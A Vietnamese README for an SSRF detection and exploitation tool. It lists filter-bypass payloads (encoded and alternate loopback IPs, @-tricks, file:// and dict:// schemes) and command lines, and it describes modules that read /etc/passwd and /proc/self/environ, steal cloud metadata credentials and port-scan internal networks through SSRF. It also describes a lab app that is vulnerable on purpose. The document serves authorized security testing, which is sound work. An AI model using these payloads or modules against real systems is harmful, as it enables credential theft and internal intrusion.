<div align="center">

# 🛰️ SSRF-Scanner

**Công cụ phát hiện & kiểm thử lỗ hổng Server-Side Request Forgery (SSRF)**

Python thuần · không phụ thuộc thư viện ngoài · chạy ngay

![Python](https://img.shields.io/badge/Python-3.10%2B-blue)
![Dependencies](https://img.shields.io/badge/dependencies-none-success)
![License](https://img.shields.io/badge/license-MIT-green)
![CWE](https://img.shields.io/badge/CWE-918-red)

</div>

> ⚠️ **CẢNH BÁO PHÁP LÝ & ĐẠO ĐỨC**
> Công cụ này chỉ dành cho mục đích **học tập** và kiểm thử bảo mật **ĐƯỢC CẤP PHÉP**
> (lab cá nhân, CTF, máy ảo tự dựng, hệ thống bạn sở hữu). Quét hệ thống khi chưa
> được phép là **vi phạm pháp luật**. Người dùng tự chịu trách nhiệm.

---

## 📑 Mục lục
- [1. SSRF là gì?](#1-ssrf-là-gì)
- [2. Tính năng](#2-tính-năng)
- [3. Cài đặt](#3-cài-đặt)
- [4. Bắt đầu nhanh (demo an toàn)](#4-bắt-đầu-nhanh-demo-an-toàn)
- [5. Cách dùng](#5-cách-dùng)
- [6. Bốn kỹ thuật phát hiện](#6-bốn-kỹ-thuật-phát-hiện)
- [7. Kỹ thuật bypass filter](#7-kỹ-thuật-bypass-filter)
- [8. Giải thích output](#8-giải-thích-output)
- [9. Kiến trúc & luồng xử lý](#9-kiến-trúc--luồng-xử-lý)
- [10. Cấu trúc project](#10-cấu-trúc-project)

---

## 1. SSRF là gì?

**Server-Side Request Forgery (SSRF)** là lỗ hổng cho phép kẻ tấn công ép **máy chủ**
gửi HTTP request tới địa chỉ do chúng kiểm soát, thay vì đích hợp lệ.

Khi một ứng dụng nhận URL từ người dùng (ví dụ tính năng "tải ảnh từ link",
"xem trước website", webhook, proxy...) mà không kiểm tra kỹ, kẻ tấn công có thể ép
server truy cập:

| Mục tiêu | Hậu quả |
|---|---|
| `http://127.0.0.1`, `localhost` | Truy cập dịch vụ nội bộ bị che sau tường lửa |
| `http://169.254.169.254/` | Đánh cắp **credential cloud** (AWS/GCP/Azure metadata) |
| `http://192.168.x.x`, `10.x.x.x` | Quét & tấn công mạng nội bộ (port scan, RCE) |
| `file:///etc/passwd` | Đọc file hệ thống |

SSRF được xếp vào **CWE-918** và nằm trong **OWASP Top 10 (A10:2021)**.

---

## 2. Tính năng

- ✅ **4 kỹ thuật phát hiện**: OAST (out-of-band), Direct, Time-based (blind), Error/diff
- ✅ **Mức độ tin cậy chuẩn ngành**: `CONFIRMED` / `FIRM` / `TENTATIVE` (mô hình Burp Suite), kèm Severity + CWE
- ✅ **Bộ payload + bypass filter**: IP decimal/hex/octal, loopback thay thế, `@`, IPv6, `file://`, `dict://`
- ✅ **Server canary OAST cục bộ** tự động xác nhận callback (bắt cả blind SSRF); hỗ trợ dịch vụ OOB ngoài (requestrepo/interactsh)
- ✅ **Nhiều điểm chèn**: query, body **form**, body **JSON**, và **header** (`Referer`, `X-Forwarded-For`...)
- ✅ **Lọc nhiễu thông minh**: baseline "host chết" → chỉ cảnh báo khi thực sự fetch được gì đó (giảm false-positive mạnh); có `--only-confirmed`
- ✅ **Nhập input linh hoạt**: URL/param/marker `FUZZ`, body POST, cookie/session, đăng nhập user/pass, **proxy qua Burp** (`--proxy`)
- ✅ **Import raw HTTP request từ Burp Suite** (`-r`) và **chế độ tương tác** (`-i`)
- ✅ **Module khai thác** (sau khi phát hiện): `readfiles` (đọc file nội bộ), `cloud` (lôi metadata AWS/Alibaba), `portscan` (quét cổng nội bộ qua SSRF)
- ✅ **Quét đa luồng** (ThreadPoolExecutor), **xuất báo cáo JSON**
- ✅ **Không phụ thuộc thư viện ngoài** — chỉ dùng thư viện chuẩn Python ≥ 3.10
- ✅ Kèm **web lab cố ý dính SSRF** để demo an toàn

---

## 3. Cài đặt

```bash
git clone https://github.com/0x0bito/SSRF-Scanner.git
cd SSRF-Scanner
python ssrf_scanner.py -h    # khong can pip install gi ca
```

Yêu cầu duy nhất: **Python ≥ 3.10**.

---

## 4. Bắt đầu nhanh (demo an toàn)

Mở **2 terminal**.

**Terminal 1 — chạy web lab cố ý dính lỗi:**
```bash
python lab/vulnerable_app.py --filter
```
(bỏ `--filter` nếu muốn lab không có bộ lọc)

**Terminal 2 — quét bằng tool, bật server canary OAST:**
```bash
python ssrf_scanner.py -u "http://127.0.0.1:5000/fetch?url=FUZZ" --oast-listen 8000
```

Kết quả: tool báo `VULNERABLE — SSRF confirmed`, và cho thấy payload loopback thay thế
(`127.0.0.2`, `127.1.1.1`) **vượt qua bộ lọc** chặn `127.0.0.1`.

---

## 5. Cách dùng

### Xem hướng dẫn
```bash
python ssrf_scanner.py -h
```

### Chế độ tương tác (hỏi từng bước — tiện demo)
```bash
python ssrf_scanner.py -i
```
Tool sẽ hỏi: URL, điểm chèn, method, body POST, cookie/session, đăng nhập user/pass,
và server OOB.

### Import request từ Burp Suite
Trong Burp: chuột phải request → **Copy to file** / **Save item**, rồi:
```bash
python ssrf_scanner.py -r examples/burp_request.txt --oast-listen 8000
# request HTTPS thì thêm --https
```
Tool tự tách method, URL, cookie/header, body; đặt `FUZZ` trong file để chỉ điểm chèn,
hoặc để tool tự tìm. Xem file mẫu: [`examples/burp_request.txt`](examples/burp_request.txt).

### Dòng lệnh
```bash
# Tự động tìm tham số nghi ngờ (url, uri, redirect, img...) trong URL
python ssrf_scanner.py -u "http://host/page?img=http://a.com&id=1"

# Chỉ định tham số cần test
python ssrf_scanner.py -u "http://host/api?target=x" -p target

# SSRF trong BODY POST (dùng FUZZ đánh dấu điểm chèn)
python ssrf_scanner.py -u "http://host/fetch" -X POST --data "url=FUZZ&id=1"

# Dùng cookie/session có sẵn
python ssrf_scanner.py -u "http://host/f?url=FUZZ" --cookie "session=abc; token=xyz"

# Tự ĐĂNG NHẬP lấy session rồi mới quét endpoint sau login
python ssrf_scanner.py -u "http://host/secure?url=FUZZ" \
    --auth-url "http://host/login" --auth-user admin --auth-pass admin123

# Dùng dịch vụ OOB ngoài cho blind SSRF (Burp Collaborator / interactsh / requestrepo / webhook.site)
python ssrf_scanner.py -u "http://host/f?url=FUZZ" --oob-url "xxx.oastify.com"
python ssrf_scanner.py -u "http://host/f?url=FUZZ" --oob-url "https://webhook.site/<uuid>"

# Xuất báo cáo JSON
python ssrf_scanner.py -u "http://host/f?url=FUZZ" --oast-listen 8000 -o report.json
```

### Khai thác sau khi phát hiện (exploitation modules)
Sau khi xác nhận có SSRF, dùng `-m` để khai thác (chỉ đọc dữ liệu):
```bash
# Chay tat ca module
python ssrf_scanner.py -u "http://host/fetch?url=FUZZ" --exploit

# Chon tung module
python ssrf_scanner.py -u "http://host/fetch?url=FUZZ" -m readfiles,cloud,portscan
```
| Module | Làm gì |
|---|---|
| `readfiles` | Đọc file nội bộ qua `file://` (`/etc/passwd`, `/proc/self/environ`...) và in nội dung |
| `cloud` | Lôi metadata cloud (AWS IAM creds / instance-id, Alibaba) — chỉ nhận giá trị thật, tránh báo nhầm |
| `portscan` | Quét cổng nội bộ qua SSRF, so sánh baseline để phân biệt open/closed |

### Bảng tham số

| Nhóm | Cờ |
|---|---|
| **Mục tiêu** | `-u/--url`, `-r/--request` (Burp), `--https`, `-p/--param`, `-X/--method`, `--data`, `--json`, `-H/--header` |
| **Phiên / đăng nhập** | `--cookie`, `--auth-url`, `--auth-user`, `--auth-pass`, `--auth-user-field`, `--auth-pass-field` |
| **OOB / OAST** | `--oast-listen` (canary cục bộ, tự xác nhận), `--oob-url` / `--oast-host` (dịch vụ ngoài) |
| **Khai thác** | `-m/--modules` (readfiles,cloud,portscan), `--exploit` (= `-m all`) |
| **Khác** | `-h/--help`, `-i/--interactive`, `--proxy` (Burp), `--only-confirmed`, `--timeout`, `--concurrency`, `--time-threshold`, `-o/--output`, `--no-banner` |

**Exit code** = `1` nếu có phát hiện mức `CONFIRMED`/`FIRM` (tiện tích hợp CI/CTF), ngược lại `0`.

### Điểm chèn được hỗ trợ
Tool tự tìm điểm chèn ở **query string**, **body form** (`url=...`), **body JSON** (`{"url":"..."}` — dùng `--json` hoặc tự nhận), và **header hay dính SSRF** (`Referer`, `X-Forwarded-For`, `X-Forwarded-Host`, `X-Real-IP`, `True-Client-IP`, `Forwarded`). Dùng marker `FUZZ` để chỉ đúng một điểm.

```bash
# SSRF trong body JSON
python ssrf_scanner.py -u "http://host/api" -X POST --json --data '{"url":"http://x","id":1}' --oast-listen 8000

# Đi qua Burp proxy để xem/replay traffic
python ssrf_scanner.py -u "http://host/f?url=FUZZ" --proxy http://127.0.0.1:8080 --oast-listen 8000

# Chỉ hiện kết quả chắc chắn (ẩn nhiễu TENTATIVE)
python ssrf_scanner.py -u "http://host/f?url=FUZZ" --oast-listen 8000 --only-confirmed
```

---

## 6. Bốn kỹ thuật phát hiện

Mức tin cậy (confidence) theo chuẩn công cụ bảo mật (kiểu Burp Suite):
`CONFIRMED` (chắc chắn, bằng chứng trực tiếp) › `FIRM` (tin cậy cao, gián tiếp)
› `TENTATIVE` (bất thường, cần xác minh thủ công).

| # | Kỹ thuật | Cách làm | Confidence |
|---|---|---|---|
| 1 | **OAST** (out-of-band) | Chèn URL trỏ về server canary; nếu server đích gọi về ⇒ dính (bắt cả blind) | `CONFIRMED` |
| 2 | **Direct** | Response lộ dấu hiệu nội bộ (metadata cloud, `root:x:0:0:`...) | `CONFIRMED` |
| 3 | **Time-based** | Trỏ IP không phản hồi, đo chênh lệch thời gian so với baseline | `FIRM` |
| 4 | **Error/diff** | Response khác hẳn baseline với mục tiêu nội bộ | `TENTATIVE` |

Mỗi phát hiện gắn **Severity: High** và **CWE-918**.

**OAST là kỹ thuật mạnh nhất** vì xác nhận được cả **blind SSRF** (khi response bị giấu):
```
Tool ──(1) chèn payload http://<token>.canary/ ──▶ Ứng dụng đích
                                                        │
Server canary ◀──(2) ứng dụng đích "mù quáng" gọi về ──┘
   │
   └──(3) Tool thấy token callback ⇒ CHẮC CHẮN có SSRF
```

---

## 7. Kỹ thuật bypass filter

Nhiều ứng dụng có bộ lọc chống SSRF, nhưng thường viết **blacklist ngây thơ** (chỉ khớp
chuỗi). Tool sinh sẵn các biến thể vượt filter:

| Kỹ thuật | Ví dụ | Vượt được filter kiểu |
|---|---|---|
| Loopback thay thế | `127.0.0.2`, `127.1.1.1`, `127.127.127.127` | chặn đúng chuỗi `127.0.0.1` |
| IP decimal | `2130706433` | blacklist dạng chấm |
| IP hex | `0x7f000001` | blacklist dạng chấm |
| IP octal | `0177.0.0.1` | blacklist dạng chuẩn |
| Rút gọn | `127.1` | so khớp đủ 4 octet |
| `@` trong URL | `http://trusted.com@127.0.0.1/` | kiểm tra "bắt đầu bằng domain tin cậy" |
| IPv6 loopback | `http://[::1]/` | blacklist chỉ IPv4 |
| Scheme khác | `file://`, `dict://` | chỉ chặn `http/https` |

**Demo đã kiểm chứng (lab bật `--filter`):**

| Payload | Qua filter? | Kết quả |
|---|---|---|
| `http://127.0.0.1:8000/<token>` | ❌ chặn (403) | không callback |
| `http://127.0.0.2:8000/<token>` | ✅ lọt | **CONFIRMED** (callback OAST) |
| `http://127.1.1.1:8000/<token>` | ✅ lọt | **CONFIRMED** (callback OAST) |

---

## 8. Giải thích output

Tool in ra **2 dạng**:

### A. Trên terminal — 3 phần

```
==================================================================
 SSRF SCAN FINDINGS
==================================================================
 Injection points : url:FUZZ
 Payloads/point   : 132
 Total findings   : 8
------------------------------------------------------------------

 [01] [CONFIRMED]  Severity: High  |  Type: SSRF
      Injection : url:FUZZ
      Technique : oast (callback qua loopback thay the 127.0.0.2 (vuot blacklist))
      Payload   : http://127.0.0.2:8000/02e7842b9851
      Evidence  : Nhan callback OAST voi token 02e7842b9851
      Response  : HTTP 200  |  0.03s
 ...

##################################################################
#  SUMMARY
##################################################################

  Verdict : VULNERABLE - SSRF confirmed (2 confirmed case(s)).
  Severity: High   |   Type: SSRF (CWE-918)

  PROOF-OF-CONCEPT - working payloads (copy for report / reproduction):
  --------------------------------------------------------------
  [CONFIRMED]  url:FUZZ  (oast)
      payload   : http://127.0.0.2:8000/02e7842b9851
      full URL  : http://127.0.0.1:5000/fetch?url=http://127.0.0.2:8000/02e7842b9851
      rationale : Nhan callback OAST voi token 02e7842b9851
  ...

  Reproduce the strongest finding:
      curl -s "http://127.0.0.1:5000/fetch?url=http://127.0.0.2:8000/02e7842b9851"
```

- **SSRF SCAN FINDINGS** — chi tiết từng phát hiện (confidence, kỹ thuật, payload, bằng chứng, HTTP + thời gian)
- **SUMMARY** — kết luận tổng (`VULNERABLE` / `LIKELY` / `POTENTIAL` / `NOT DETECTED`) + severity + CWE
- **PROOF-OF-CONCEPT** — danh sách payload hoạt động + URL/body đầy đủ + lệnh `curl` tái hiện

### B. Báo cáo JSON (`-o report.json`)
```json
{
  "vulnerability": "SSRF",
  "cwe": "CWE-918",
  "severity": "High",
  "vulnerable": true,
  "injection_points": ["url:FUZZ"],
  "findings": [
    {
      "injection_point": "url:FUZZ",
      "confidence": "CONFIRMED",
      "technique": "oast",
      "payload": "http://127.0.0.2:8000/02e7842b9851",
      "evidence": "Nhan callback OAST voi token 02e7842b9851",
      "http_status": 200,
      "elapsed_s": 0.03
    }
  ]
}
```

---

## 9. Kiến trúc & luồng xử lý

```
[Input: -u URL / -r Burp request / -i tương tác]
        │
        ▼
[1] Xác định điểm chèn  ──▶  query string, body POST, hoặc marker FUZZ
        │
        ▼
[2] Sinh payload (~132/điểm)  ──▶  nội bộ + metadata + bypass + OAST + time
        │
        ▼
[3] (tuỳ chọn) Đăng nhập lấy session cookie
        │
        ▼
[4] Gửi request song song (ThreadPoolExecutor), giữ session qua CookieJar
        │
        ▼
[5] Phân tích:  callback OAST?  lộ dấu hiệu nội bộ?  chênh lệch thời gian?  khác baseline?
        │
        ▼
[6] Báo cáo: FINDINGS + SUMMARY + PROOF-OF-CONCEPT  (+ JSON)
```

---

## 10. Cấu trúc project

```
SSRF-Scanner/
├── ssrf_scanner.py          # Tool all-in-one (payload + OAST + detector + report + CLI)
├── lab/
│   └── vulnerable_app.py     # Web lab cố ý dính SSRF (có --filter, /login, /secure-fetch)
├── examples/
│   └── burp_request.txt      # File request mẫu để test -r
├── requirements.txt          # (trống — không cần thư viện ngoài)
├── LICENSE                   # MIT + disclaimer
└── README.md
```

### Endpoint của web lab
| Endpoint | Mô tả |
|---|---|
| `GET /fetch?url=` | SSRF cơ bản (GET) |
| `POST /fetch` body `url=` | SSRF qua body — test `--data` |
| `POST /login` | Đăng nhập (user demo **admin/admin123**), set cookie `sess` |
| `GET /secure-fetch?url=` | SSRF **sau đăng nhập** (cần cookie) — test `--auth-*` |
| `GET /latest/meta-data` | Giả lập trang metadata nội bộ |

---

<div align="center">

**Made for educational & authorized security testing only.**
MIT License · CWE-918 · OWASP A10:2021

</div>
